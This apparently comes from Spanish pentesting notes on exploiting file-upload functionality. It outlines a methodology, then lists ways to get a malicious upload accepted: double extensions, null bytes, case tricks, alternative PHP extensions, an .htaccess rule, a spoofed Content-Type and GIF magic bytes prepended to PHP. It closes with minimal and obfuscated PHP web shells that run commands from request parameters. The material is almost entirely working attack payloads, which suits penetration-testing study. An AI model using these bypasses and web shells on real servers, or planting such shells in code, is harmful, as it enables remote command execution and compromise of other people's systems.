

### Metodología

1. **Identificar funcionalidad de upload**: Encontrar dónde se pueden subir archivos
2. **Probar extensiones permitidas**: Intentar subir diferentes tipos de archivos
3. **Bypassear validaciones**: Extension, content-type, magic bytes
4. **Determinar ubicación del archivo**: Encontrar dónde se guarda el archivo subido
5. **Ejecutar el payload**: Acceder al archivo subido para activar el código

### Bypass de validación de extensión

```ruby
# Doble extensión
shell.php.jpg
shell.jpg.php

# Null byte (versiones antiguas)
shell.php%00.jpg
shell.php\x00.jpg

# Mayúsculas
shell.PhP
shell.pHp

# Extensiones alternativas
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar

# .htaccess trick
AddType application/x-httpd-php .jpg
```


### Bypass de validación de content-type 

```ruby
Content-Type: application/x-php
#es php pero no solo soporta GIF

#cambiamos el content-type por un valor válido
Content-Type: image/gif
```

### Bypass de validación de content-type con magic bytes

```ruby
Content-Type: image/jpeg
# Pero el contenido es PHP

# Agregar magic bytes de imagen (los magic bytes varían dependiendo del tipo de imagen)
GIF89a
<?php system($_GET['cmd']); ?>
```

### Bypass con compresión

```ruby
# Crear archivo comprimido con shell
zip shell.zip shell.php

# Subir el ZIP y extraerlo server-side
```

### Shells web simples

```php
# Shell mínimo PHP
<?php system($_GET['cmd']); ?>

# Shell con funciones alternativas
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo exec($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>

# Shell ofuscado
<?php @eval($_POST[1]); ?>
<?=`$_GET[0]`?>
```


